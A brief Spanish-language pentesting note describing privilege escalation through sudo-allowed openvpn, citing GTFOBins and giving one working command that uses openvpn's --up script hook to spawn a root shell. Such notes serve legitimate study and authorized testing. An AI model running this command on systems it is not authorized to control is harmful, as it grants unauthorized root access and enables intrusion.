## DESCRIPTION

Escalada de privilegios si podemos ejecutar con "sudo" el programa openvpn

![[Pasted image 20230411180207.png]]

#### Mas información
* https://gtfobins.github.io/gtfobins/openvpn/


## EXPLOITATION

```
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
```

## MACHINES


